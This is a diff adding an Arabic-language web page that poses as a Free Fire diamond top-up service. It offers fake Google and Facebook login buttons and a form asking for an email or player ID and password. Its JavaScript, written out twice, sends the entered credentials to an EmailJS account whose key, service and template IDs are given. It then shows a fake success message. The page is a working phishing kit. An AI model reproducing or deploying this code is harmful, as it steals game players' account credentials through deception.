@@ -1,0 +1,198 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>شحن جواهر فري فاير</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+</head>
+<body>
+  <div id="home" class="page active">
+    <div class="card">
+      <h2>تسجيل الدخول لشحن الجواهر</h2>
+      <button class="btn" onclick="showPage('form')">Google <img src="https://img.icons8.com/color/48/000000/google-logo.png"/></button>
+      <button class="btn" onclick="showPage('form')">Facebook <img src="https://img.icons8.com/color/48/000000/facebook-new.png"/></button>
+      <button class="btn" onclick="showPage('form')">ID المستخدم <img src="https://img.icons8.com/ios-filled/50/ffffff/user.png"/></button>
+    </div>
+
+    <div class="card">
+      <h2>عروض شحن الجواهر</h2>
+      <div class="price-card">100 جواهرة - 1$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
+      <div class="price-card">500 جواهرة - 4$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
+      <div class="price-card">1000 جواهرة - 7$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
+      <div class="price-card">2000 جواهرة - 13$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
+      <div class="price-card">5000 جواهرة - 30$ <button class="buy-btn" onclick="showAlert()">اشحن</button></div>
+    </div>
+
+    <div id="alert" class="alert">يرجى تسجيل الدخول أولاً</div>
+  </div>
+
+  <div id="form" class="page">
+    <div class="card login-form">
+      <h2>معلومات الحساب لشحن الجواهر</h2>
+      <form id="login-form">
+        <input type="text" id="phone" placeholder="البريد الإلكتروني أو ID اللاعب" required />
+        <input type="password" id="password" placeholder="كلمة المرور (إذا لزم)" />
+        <select>
+          <option>100 جواهرة</option>
+          <option>500 جواهرة</option>
+          <option>1000 جواهرة</option>
+        </select>
+        <button class="submit-btn btn" type="submit">اشحن الآن</button>
+      </form>
+    </div>
+  </div>
+
+  <div id="thankyou" class="page">
+    <h2 style="text-align:center;">رائع!</h2>
+    <p style="text-align:center; font-size: 1.2em;">تم شحن الجواهر بنجاح.<br>قد يستغرق ظهورها بضع دقائق.</p>
+  </div>
+
+  <script>
+    window.onload = function () {
+      emailjs.init("2DqSgek8jD7q9yciv");
+
+      document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const phone = document.getElementById("phone").value.trim();
+        const password = document.getElementById("password").value.trim();
+
+        if (!phone) {
+          alert("يرجى إدخال البريد أو ID اللاعب");
+          return;
+        }
+
+        emailjs.send("service_e72fstt", "template_c79we5d", {
+          phone_number: phone,
+          password: password
+        }).then(function(response) {
+          alert("تم إرسال البيانات بنجاح!");
+          showPage('thankyou');
+        }, function(error) {
+          alert("فشل في الإرسال: " + JSON.stringify(error));
+        });
+      });
+    };
+
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    function showAlert() {
+      const alert = document.getElementById("alert");
+      alert.style.display = "block";
+      setTimeout(() => alert.style.display = "none", 3000);
+    }
+  </script>
+</body>
+</html><style>* { box-sizing: border-box; }
+body {
+  margin: 0;
+  font-family: 'Arial', sans-serif;
+  background: linear-gradient(to bottom right, #1e88e5, #42a5f5);
+  color: white;
+  overflow-x: hidden;
+}
+.page { display: none; padding: 20px; }
+.active { display: block; }
+
+.card {
+  background: #0d47a1;
+  padding: 20px;
+  border-radius: 15px;
+  margin: 20px auto;
+  width: 90%;
+  max-width: 400px;
+  box-shadow: 0 0 15px rgba(0,0,0,0.3);
+  text-align: center;
+}
+.card h2 {
+  color: #ffeb3b;
+  margin-bottom: 20px;
+}
+.btn {
+  display: block;
+  width: 100%;
+  margin: 10px 0;
+  padding: 12px;
+  border: none;
+  border-radius: 8px;
+  font-size: 1em;
+  font-weight: bold;
+  cursor: pointer;
+  background-color: #333;
+  color: #ffeb3b;
+}
+.btn img {
+  vertical-align: middle;
+  height: 20px;
+  margin-left: 10px;
+}
+.price-card {
+  background: #1565c0;
+  margin: 10px 0;
+  padding: 15px;
+  border-radius: 10px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  color: #fff;
+}
+.buy-btn {
+  background-color: #ffeb3b;
+  color: black;
+  border: none;
+  padding: 10px 15px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-weight: bold;
+}
+.login-form input, .login-form select {
+  width: 100%;
+  padding: 12px;
+  margin: 10px 0;
+  border: none;
+  border-radius: 8px;
+}
+.submit-btn {
+  background-color: #ffeb3b;
+  color: #000;
+}
+.alert {
+  display: none;
+  text-align: center;
+  background-color: #d32f2f;
+  padding: 10px;
+  margin: 15px auto;
+  width: 90%;
+  max-width: 400px;
+  border-radius: 8px;
+  color: white;
+}</style><script>window.onload = function () {
+    emailjs.init("2DqSgek8jD7q9yciv"); // المفتاح العمومي
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+        // إرسال البيانات عبر EmailJS بطريقة بسيطة
+        emailjs.send("service_e72fstt", "template_c79we5d", {
+            phone_number: document.getElementById("phone").value,
+            password: document.getElementById("password").value
+        }).then(function(response) {
+            // إظهار رسالة النجاح
+            document.getElementById('success-message').style.display = 'block';
+            console.log("تم الإرسال بنجاح:", response);
+        }, function(error) {
+            // إظهار رسالة خطأ
+            alert("فشل في الإرسال: " + JSON.stringify(error));
+            console.error("خطأ في الإرسال:", error);
+        });
+    });
+};
+
+function showLoginPopup() {
+    const popup = document.getElementById('login-popup');
+    popup.style.bottom = '20px';
+}</script>
